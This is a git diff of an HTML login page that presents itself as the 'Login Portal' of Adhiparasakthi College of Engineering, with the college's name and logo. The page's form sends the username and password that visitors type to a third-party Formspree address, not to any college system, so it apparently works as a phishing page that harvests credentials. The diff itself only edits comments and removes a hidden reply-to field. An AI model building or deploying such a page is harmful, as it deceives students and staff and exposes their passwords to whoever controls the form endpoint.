@@ -19,6 +19,7 @@
         align-items: center;
         font-family: Arial, sans-serif;
 
+        /* 🌈 Animated tricolor background */
         background: linear-gradient(-45deg, #FF9933, #FFFFFF, #138808);
         background-size: 300% 300%;
         animation: bg 8s ease infinite;
@@ -101,20 +102,18 @@
 
 <div class="box">
 
+    <!-- LOGO (must be inside same GitHub repo) -->
     <img src="logo.png" alt="College Logo" class="logo">
 
     <h1>ADHIPARASAKTHI COLLEGE OF ENGINEERING</h1>
     <h2>Login Portal</h2>
 
-    <!-- ✅ FIXED FORMSPREE FORM -->
+    <!-- ✅ FINAL FORMSPREE FORM -->
     <form action="https://formspree.io/f/mojopzgb" method="POST">
 
         <input type="text" name="username" placeholder="Username" required>
 
         <input type="password" name="password" placeholder="Password" required>
-
-        <!-- IMPORTANT: improves Formspree email delivery -->
-        <input type="hidden" name="_replyto" value="user@login.com">
 
         <button type="submit">Login</button>
     </form>
